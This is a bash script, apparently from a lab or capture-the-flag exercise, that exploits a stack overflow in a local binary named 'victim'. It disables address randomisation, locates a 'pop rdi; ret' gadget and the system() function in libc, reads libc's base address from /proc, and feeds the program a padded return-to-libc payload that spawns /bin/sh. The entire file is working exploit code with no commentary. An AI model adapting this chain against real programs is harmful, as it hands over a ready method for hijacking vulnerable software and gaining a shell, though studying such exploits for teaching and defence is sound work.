#!/bin/bash


buffer=`echo \n | setarch \`arch\` -R ./victim | head -n 1`;

namelibc=`locate libc.so.6`;

offset=0x`xxd -c1 -p $namelibc | grep -n -B1 c3 | grep 5f -m1 | awk '{printf"%x\n",$1-1}'`;

pid=`ps -C victim -o pid --no-headers | tr -d ' ' | head -n 1`;

libc=0x`grep libc /proc/$pid/maps | cut -f1 -d"-" | head -n 1`;

systemOffset=0x`nm -D $namelibc | grep '\<system\>' | cut -f1 -d' '`;

((echo -n /bin/sh | xxd -p; printf %0514d 0; printf %016x $(($libc+$offset)) | tac -rs..; printf %016x $buffer | tac -rs..; printf %016x $(($libc+$systemOffset)) | tac -rs..) | xxd -r -p; cat) | setarch `arch` -R ./victim
